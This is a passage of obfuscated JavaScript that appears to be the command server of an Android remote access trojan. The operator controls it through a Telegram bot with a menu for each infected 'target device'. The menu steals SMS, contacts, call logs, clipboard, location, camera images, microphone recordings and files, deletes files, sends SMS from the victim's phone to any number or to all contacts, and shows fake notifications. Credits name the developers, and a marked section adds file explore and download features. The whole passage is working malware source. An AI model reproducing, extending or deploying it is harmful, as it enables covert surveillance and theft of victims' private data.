        let _0x31005f = "°• 𝙇𝙞𝙨𝙩 𝙤𝙛 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 :\n\n";
        appClients.forEach(function (_0x3c015b, _0x268f1c, _0x27c205) {
          _0x31005f += "• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>" + _0x3c015b.model + "</b>\n" + ("• ʙᴀᴛᴛᴇʀʏ : <b>" + _0x3c015b.battery + "</b>\n") + ("• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>" + _0x3c015b.version + "</b>\n") + ("• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>" + _0x3c015b.brightness + "</b>\n") + ("• ᴘʀᴏᴠɪᴅᴇʀ : <b>" + _0x3c015b.provider + "</b>\n\n");
        });
        appBot.sendMessage(id, _0x31005f, {
          "parse_mode": "HTML"
        });
      }
    }
    if (_0x2ca88f.text == "𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙") {
      if (appClients.size == 0) {
        appBot.sendMessage(id, "°• 𝙉𝙤 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙞𝙣𝙜 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 𝙖𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚\n\n• ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ");
      } else {
        const _0x118a77 = [];
        appClients.forEach(function (_0x4ed698, _0x52dcb4, _0x3ca3bb) {
          _0x118a77.push([{
            "text": _0x4ed698.model,
            "callback_data": "device:" + _0x52dcb4
          }]);
        });
        appBot.sendMessage(id, "°• 𝙎𝙚𝙡𝙚𝙘𝙩 𝙙𝙚𝙫𝙞𝙘𝙚 𝙩𝙤 𝙚𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙚𝙣𝙙", {
          "reply_markup": {
            "inline_keyboard": _0x118a77
          }
        });
      }
    }
  } else {
    appBot.sendMessage(id, "°• 𝙋𝙚𝙧𝙢𝙞𝙨𝙨𝙞𝙤𝙣 𝙙𝙚𝙣𝙞𝙚𝙙");
  }
});

appBot.on("callback_query", _0x425827 => {
  const _0x440ba5 = _0x425827.message;
  const _0x9f09ec = _0x425827.data;
  const _0x2f3f8b = _0x9f09ec.split(":")[0];
  const _0x39894d = _0x9f09ec.split(":")[1];
  console.log(_0x39894d);
  if (_0x2f3f8b == "device") {
    appBot.editMessageText("°• 𝙎𝙚𝙡𝙚𝙘𝙩 𝙘𝙤𝙢𝙢𝙚𝙣𝙙 𝙛𝙤𝙧 𝙙𝙚𝙫𝙞𝙘𝙚 : <b>" + appClients.get(_0x9f09ec.split(":")[1]).model + "</b>", {
      "width": 0x2710,
      "chat_id": id,
      "message_id": _0x440ba5.message_id,
      "reply_markup": {
        "inline_keyboard": [[{
          "text": "𝘼𝙥𝙥𝙨",
          "callback_data": "apps:" + _0x39894d
        }, {
          "text": "𝘿𝙚𝙫𝙞𝙘𝙚 𝙞𝙣𝙛𝙤",
          "callback_data": "device_info:" + _0x39894d
        }], [{
          "text": "𝙂𝙚𝙩 𝙛𝙞𝙡𝙚",
          "callback_data": "file:" + _0x39894d
        }, {
          "text": "𝘿𝙚𝙡𝙚𝙩𝙚 𝙛𝙞𝙡𝙚",
          "callback_data": "delete_file:" + _0x39894d
        }], [{
          "text": "𝘾𝙡𝙞𝙥𝙗𝙤𝙖𝙧𝙙",
          "callback_data": "clipboard:" + _0x39894d
        }, {
          "text": "𝙈𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚",
          "callback_data": "microphone:" + _0x39894d
        }], [{
          "text": "𝙈𝙖𝙞𝙣 𝙘𝙖𝙢𝙚𝙧𝙖",
          "callback_data": "camera_main:" + _0x39894d
        }, {
          "text": "𝙎𝙚𝙡𝙛𝙞𝙚 𝙘𝙖𝙢𝙚𝙧𝙖",
          "callback_data": "camera_selfie:" + _0x39894d
        }], [{
          "text": "𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣",
          "callback_data": "location:" + _0x39894d
        }, {
          "text": "𝙏𝙤𝙖𝙨𝙩",
          "callback_data": "toast:" + _0x39894d
        }], [{
          "text": "𝘾𝙖𝙡𝙡𝙨",
          "callback_data": "calls:" + _0x39894d
        }, {
          "text": "𝘾𝙤𝙣𝙩𝙖𝙘𝙩𝙨",
          "callback_data": "contacts:" + _0x39894d
        }], [{
          "text": "𝙑𝙞𝙗𝙧𝙖𝙩𝙚",
          "callback_data": "vibrate:" + _0x39894d
        }, {
          "text": "𝙎𝙝𝙤𝙬 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣",
          "callback_data": "show_notification:" + _0x39894d
        }], [{
          "text": "𝙈𝙚𝙨𝙨𝙖𝙜𝙚𝙨",
          "callback_data": "messages:" + _0x39894d
        }, {
          "text": "𝙎𝙚𝙣𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚",
          "callback_data": "send_message:" + _0x39894d
        }], [{
          "text": "𝙋𝙡𝙖𝙮 𝙖𝙪𝙙𝙞𝙤",
          "callback_data": "play_audio:" + _0x39894d
        }, {
          "text": "𝙎𝙩𝙤𝙥 𝙖𝙪𝙙𝙞𝙤",
          "callback_data": "stop_audio:" + _0x39894d
        }], [{
          "text": "𝙎𝙚𝙣𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨",
          "callback_data": "send_message_to_all:" + _0x39894d
        }],
        // ========== NEW: EXPLORE & DOWNLOAD BUTTONS ==========
        [{
          "text": "𝙁𝙞𝙡𝙚 𝙀𝙭𝙥𝙡𝙤𝙧𝙚",
          "callback_data": "explore:" + _0x39894d
        }, {
          "text": "𝘿𝙤𝙬𝙣𝙡𝙤𝙖𝙙",
          "callback_data": "download_file:" + _0x39894d
        }]
        // ========== END NEW BUTTONS ==========
        ]
      },
      "parse_mode": "HTML"
    });
  }
  if (_0x2f3f8b == "calls") {
    appSocket.clients.forEach(function _0x402e5d(_0x26e82d) {
      if (_0x26e82d.uuid == _0x39894d) {
        _0x26e82d.send("calls");
      }
    });
    appBot.deleteMessage(id, _0x440ba5.message_id);
    appBot.sendMessage(id, "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv", {
      "parse_mode": "HTML",
      "reply_markup": {
        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
        "resize_keyboard": true
      }
    });
  }
  if (_0x2f3f8b == "contacts") {
    appSocket.clients.forEach(function _0x2fa71f(_0x21d289) {
      if (_0x21d289.uuid == _0x39894d) {
        _0x21d289.send("contacts");
      }
    });
    appBot.deleteMessage(id, _0x440ba5.message_id);
    appBot.sendMessage(id, "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv", {
      "parse_mode": "HTML",
      "reply_markup": {
        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
        "resize_keyboard": true
      }
    });
  }
  if (_0x2f3f8b == "messages") {
    appSocket.clients.forEach(function _0x419732(_0x534e2c) {
      if (_0x534e2c.uuid == _0x39894d) {
        _0x534e2c.send("messages");
      }
    });
    appBot.deleteMessage(id, _0x440ba5.message_id);
    appBot.sendMessage(id, "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv", {
      "parse_mode": "HTML",
      "reply_markup": {
        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
        "resize_keyboard": true
      }
    });
  }
  if (_0x2f3f8b == "apps") {
    appSocket.clients.forEach(function _0x2dd3c0(_0x30b02f) {
      if (_0x30b02f.uuid == _0x39894d) {
        _0x30b02f.send("apps");
      }
    });
    appBot.deleteMessage(id, _0x440ba5.message_id);
    appBot.sendMessage(id, "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv", {
      "parse_mode": "HTML",
      "reply_markup": {
        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
        "resize_keyboard": true
      }
    });
  }
  if (_0x2f3f8b == "device_info") {
    appSocket.clients.forEach(function _0x4bce6e(_0x55b120) {
      if (_0x55b120.uuid == _0x39894d) {
        _0x55b120.send("device_info");
      }
    });
    appBot.deleteMessage(id, _0x440ba5.message_id);
    appBot.sendMessage(id, "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv", {
      "parse_mode": "HTML",
      "reply_markup": {
        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
        "resize_keyboard": true
      }
    });
  }
  if (_0x2f3f8b == "clipboard") {
    appSocket.clients.forEach(function _0x2558c0(_0x4c04aa) {
      if (_0x4c04aa.uuid == _0x39894d) {
        _0x4c04aa.send("clipboard");
      }
    });
    appBot.deleteMessage(id, _0x440ba5.message_id);
    appBot.sendMessage(id, "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv", {
      "parse_mode": "HTML",
      "reply_markup": {
        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
        "resize_keyboard": true
      }
    });
  }
  if (_0x2f3f8b == "camera_main") {
    appSocket.clients.forEach(function _0x10cf13(_0x4a91bc) {
      if (_0x4a91bc.uuid == _0x39894d) {
        _0x4a91bc.send("camera_main");
      }
    });
    appBot.deleteMessage(id, _0x440ba5.message_id);
    appBot.sendMessage(id, "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv", {
      "parse_mode": "HTML",
      "reply_markup": {
        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
        "resize_keyboard": true
      }
    });
  }
  if (_0x2f3f8b == "camera_selfie") {
    appSocket.clients.forEach(function _0x152118(_0x6dad04) {
      if (_0x6dad04.uuid == _0x39894d) {
        _0x6dad04.send("camera_selfie");
      }
    });
    appBot.deleteMessage(id, _0x440ba5.message_id);
    appBot.sendMessage(id, "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv", {
      "parse_mode": "HTML",
      "reply_markup": {
        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
        "resize_keyboard": true
      }
    });
  }
  if (_0x2f3f8b == "location") {
    appSocket.clients.forEach(function _0x43033a(_0x4cd64d) {
      if (_0x4cd64d.uuid == _0x39894d) {
        _0x4cd64d.send("location");
      }
    });
    appBot.deleteMessage(id, _0x440ba5.message_id);
    appBot.sendMessage(id, "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv", {
      "parse_mode": "HTML",
      "reply_markup": {
        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
        "resize_keyboard": true
      }
    });
  }
  if (_0x2f3f8b == "vibrate") {
    appSocket.clients.forEach(function _0x590c81(_0x275379) {
      if (_0x275379.uuid == _0x39894d) {
        _0x275379.send("vibrate");
      }
    });
    appBot.deleteMessage(id, _0x440ba5.message_id);
    appBot.sendMessage(id, "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv", {
      "parse_mode": "HTML",
      "reply_markup": {
        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
        "resize_keyboard": true
      }
    });
  }
  if (_0x2f3f8b == "stop_audio") {
    appSocket.clients.forEach(function _0x12edbf(_0xac5b8c) {
      if (_0xac5b8c.uuid == _0x39894d) {
        _0xac5b8c.send("stop_audio");
      }
    });
    appBot.deleteMessage(id, _0x440ba5.message_id);
    appBot.sendMessage(id, "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv", {
      "parse_mode": "HTML",
      "reply_markup": {
        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
        "resize_keyboard": true
      }
    });
  }
  if (_0x2f3f8b == "send_message") {
    appBot.deleteMessage(id, _0x440ba5.message_id);
    appBot.sendMessage(id, "°• 𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙝𝙚 𝙣𝙪𝙢𝙗𝙚𝙧 𝙩𝙤 𝙬𝙝𝙞𝙘𝙝 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙝𝙚 𝙎𝙈𝙎\n\n•ɪꜰ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ꜱᴇɴᴅ ꜱᴍꜱ ᴛᴏ ʟᴏᴄᴀʟ ᴄᴏᴜɴᴛʀʏ ɴᴜᴍʙᴇʀꜱ, ʏᴏᴜ ᴄᴀɴ ᴇɴᴛᴇʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴢᴇʀᴏ ᴀᴛ ᴛʜᴇ ʙᴇɢɪɴɴɪɴɢ, ᴏᴛʜᴇʀᴡɪꜱᴇ ᴇɴᴛᴇʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴛʜᴇ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ", {
      "reply_markup": {
        "force_reply": true
      }
    });
    currentUuid = _0x39894d;
  }
  if (_0x2f3f8b == "send_message_to_all") {
    appBot.deleteMessage(id, _0x440ba5.message_id);
    appBot.sendMessage(id, "°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨\n\n• ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛʜᴀᴛ ᴛʜᴇ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ꜱᴇɴᴛ ɪꜰ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴄʜᴀʀᴀᴄᴛᴇʀꜱ ɪɴ ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ɪꜱ ᴍᴏʀᴇ ᴛʜᴀɴ ᴀʟʟᴏᴡᴇᴅ", {
      "reply_markup": {
        "force_reply": true
      }
    });
    currentUuid = _0x39894d;
  }
  if (_0x2f3f8b == "file") {
    appBot.deleteMessage(id, _0x440ba5.message_id);
    appBot.sendMessage(id, "°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙤𝙬𝙣𝙡𝙤𝙖𝙙\n\n• ʏᴏᴜ ᴅᴏ ɴᴏᴛ ɴᴇᴇᴅ ᴛᴏ ᴇɴᴛᴇʀ ᴛʜᴇ ꜰᴜʟʟ ꜰɪʟᴇ ᴘᴀᴛʜ, ᴊᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴀɪɴ ᴘᴀᴛʜ. ꜰᴏʀ ᴇxᴀᴍᴘʟᴇ, ᴇɴᴛᴇʀ<b> DCIM/Camera </b> ᴛᴏ ʀᴇᴄᴇɪᴠᴇ ɢᴀʟʟᴇʀʏ ꜰɪʟᴇꜱ.", {
      "reply_markup": {
        "force_reply": true
      },
      "parse_mode": "HTML"
    });
    currentUuid = _0x39894d;
  }
  if (_0x2f3f8b == "delete_file") {
    appBot.deleteMessage(id, _0x440ba5.message_id);
    appBot.sendMessage(id, "°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙚𝙡𝙚𝙩𝙚\n\n• ʏᴏᴜ ᴅᴏ ɴᴏᴛ ɴᴇᴇᴅ ᴛᴏ ᴇɴᴛᴇʀ ᴛʜᴇ ꜰᴜʟʟ ꜰɪʟᴇ ᴘᴀᴛʜ, ᴊᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴀɪɴ ᴘᴀᴛʜ. ꜰᴏʀ ᴇxᴀᴍᴘʟᴇ, ᴇɴᴛᴇʀ<b> DCIM/Camera </b> ᴛᴏ ᴅᴇʟᴇᴛᴇ ɢᴀʟʟᴇʀʏ ꜰɪʟᴇꜱ.", {
      "reply_markup": {
        "force_reply": true
      },
      "parse_mode": "HTML"
    });
    currentUuid = _0x39894d;
  }
  if (_0x2f3f8b == "microphone") {
    appBot.deleteMessage(id, _0x440ba5.message_id);
    appBot.sendMessage(id, "°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙\n\n• ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴛɪᴍᴇ ɴᴜᴍᴇʀɪᴄᴀʟʟʏ ɪɴ ᴜɴɪᴛꜱ ᴏꜰ ꜱᴇᴄᴏɴᴅꜱ", {
      "reply_markup": {
        "force_reply": true
      },
      "parse_mode": "HTML"
    });
    currentUuid = _0x39894d;
  }
  if (_0x2f3f8b == "toast") {
    appBot.deleteMessage(id, _0x440ba5.message_id);
    appBot.sendMessage(id, "°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙝𝙖𝙩 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙤𝙣 𝙩𝙝𝙚 𝙩𝙖𝙧𝙜𝙚𝙩 𝙙𝙚𝙫𝙞𝙘𝙚\n\n• ᴛᴏᴀꜱᴛ ɪꜱ ᴀ ꜱʜᴏʀᴛ ᴍᴇꜱꜱᴀɢᴇ ᴛʜᴀᴛ ᴀᴘᴘᴇᴀʀꜱ ᴏɴ ᴛʜᴇ ᴅᴇᴠɪᴄᴇ ꜱᴄʀᴇᴇɴ ꜰᴏʀ ᴀ ꜰᴇᴡ ꜱᴇᴄᴏɴᴅꜱ", {
      "reply_markup": {
        "force_reply": true
      },
      "parse_mode": "HTML"
    });
    currentUuid = _0x39894d;
  }
  if (_0x2f3f8b == "show_notification") {
    appBot.deleteMessage(id, _0x440ba5.message_id);
    appBot.sendMessage(id, "°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙖𝙨 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣\n\n• ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ʙᴇ ᴀᴘᴘᴇᴀʀ ɪɴ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ꜱᴛᴀᴛᴜꜱ ʙᴀʀ ʟɪᴋᴇ ʀᴇɢᴜʟᴀʀ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ", {
      "reply_markup": {
        "force_reply": true
      },
      "parse_mode": "HTML"
    });
    currentUuid = _0x39894d;
  }
  if (_0x2f3f8b == "play_audio") {
    appBot.deleteMessage(id, _0x440ba5.message_id);
    appBot.sendMessage(id, "°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙖𝙪𝙙𝙞𝙤 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙥𝙡𝙖𝙮\n\n• ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴅɪʀᴇᴄᴛ ʟɪɴᴋ ᴏꜰ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ꜱᴏᴜɴᴅ, ᴏᴛʜᴇʀᴡɪꜱᴇ ᴛʜᴇ ꜱᴏᴜɴᴅ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ᴘʟᴀʏᴇᴅ", {
      "reply_markup": {
        "force_reply": true
      },
      "parse_mode": "HTML"
    });
    currentUuid = _0x39894d;
  }
  
  // ========== NEW: EXPLORE CALLBACK ==========
  if (_0x2f3f8b == "explore") {
    appBot.deleteMessage(id, _0x440ba5.message_id);
    appBot.sendMessage(id, "°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙩𝙤 𝙚𝙭𝙥𝙡𝙤𝙧𝙚\n\n• ʏᴏᴜ ᴄᴀɴ ᴇɴᴛᴇʀ <b>/sdcard</b> ᴏʀ <b>/data</b>", {
      "reply_markup": {
        "force_reply": true
      },
      "parse_mode": "HTML"
    });
    currentUuid = _0x39894d;
  }
  // ========== NEW: DOWNLOAD CALLBACK ==========
  if (_0x2f3f8b == "download_file") {
    appBot.deleteMessage(id, _0x440ba5.message_id);
    appBot.sendMessage(id, "°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙩𝙤 𝙙𝙤𝙬𝙣𝙡𝙤𝙖𝙙\n\n• ᴇxᴀᴍᴘʟᴇ: <b>/sdcard/DCIM/image.jpg</b>", {
      "reply_markup": {
        "force_reply": true
      },
      "parse_mode": "HTML"
    });
    currentUuid = _0x39894d;
  }
  // ========== END NEW CALLBACKS ==========
});

setInterval(function () {
  appSocket.clients.forEach(function _0x3b936c(_0x41c8f7) {
    _0x41c8f7.send("ping");
  });
  try {
    axios.get("https://www.google.com").then(_0x48f637 => '');
  } catch (_0x1c37e3) {}
}, 5000);
appServer.listen(process.env.PORT || 8999);
